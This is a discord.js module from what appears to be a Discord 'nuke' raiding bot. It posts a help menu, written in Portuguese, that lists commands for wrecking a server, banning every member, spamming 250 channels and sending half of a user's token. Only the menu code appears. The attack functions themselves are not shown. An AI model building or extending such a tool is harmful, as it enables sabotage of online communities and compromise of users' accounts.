const Discord = require('discord.js');

module.exports.run = (client, msg) => {
    msg.delete();
    const embed = new Discord.RichEmbed()
    .setAuthor('Killer - Attack ϟ', msg.author.displayAvatarURL)
    .addField('knuke', '`faz uma destruição em massa em um servidor.`', false)
    .addField('kbanall', '`bane todos os membros de um servidor.`', false)
    .addField('kremover', '`remove os inativos com a range de (1) dias.`', false)
    .addField('ktoken', '`manda a metade do token de um user`', false)
    .addField('kchn', '`cria 250 canais.`', false)
    .addField('killer', '`manda uma frase.`', false)
    .setFooter('are you ready to die? (Todos comandos são executados no formato Prefixo + Comando)')
    .setImage('https://media.discordapp.net/attachments/801985357737361448/802962775000875018/24c83527e385ec9eec6ce65076c785d6.png?width=1025&height=274')

    msg.channel.send(embed);
}


